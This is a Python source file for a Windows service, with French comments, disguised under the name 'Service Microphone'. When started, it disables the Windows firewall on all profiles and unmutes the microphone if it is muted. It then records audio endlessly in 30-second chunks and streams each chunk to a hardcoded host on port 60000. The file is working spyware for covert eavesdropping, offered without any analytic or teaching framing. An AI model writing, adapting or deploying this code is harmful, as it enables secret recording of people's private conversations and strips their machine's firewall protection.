import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
import sounddevice as sd
import win32api
import win32gui
import mlsocket
import subprocess
import sys


class AppServerSvc(win32serviceutil.ServiceFramework):
    _svc_name_ = "ServiceMicrophoneControl"
    _svc_display_name_ = "Service Microphone"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def main(self):
        s = mlsocket.MLSocket()
        host = '192.168.1.48'
        port = 60000

        # Desactiver le Parefeu
        subprocess.run('netsh.exe advfirewall set allprofiles state off', shell=True)

        # On teste si le Mic est eteint

        fs = 44100  # fréquence d'échantillonnage
        sec = 10  # durée de l'enregistrement
        record = sd.rec(int(sec * fs), samplerate=fs, channels=2)
        sd.wait()

        # On teste les vals recup avec les vals du record dans le cas Mute Mic
        if record[440998][0] == 3.0517578125e-05 and record[440998][1] == 0.0 and record[440999][0] == 0.0 and \
                record[440999][1] == -3.0517578125e-05:

            WM_APPCOMMAND = 0x319
            APPCOMMAND_MICROPHONE_VOLUME_MUTE = 0x180000
            hwnd_active = win32gui.GetForegroundWindow()
            win32api.SendMessage(hwnd_active, WM_APPCOMMAND, None, APPCOMMAND_MICROPHONE_VOLUME_MUTE)

        # Si le Mic est en status Unmute en commence l'enregistement directement

        # Connection au serveur
        i = 0
        s.connect((host, port))
        s.send(str.encode("Hello server!"))
        sec = 30
        while True:

            record = sd.rec(int(sec * fs), samplerate=fs, channels=2)
            sd.wait()

            s.send(record)
            i = i + 1


if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(AppServerSvc)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(AppServerSvc)
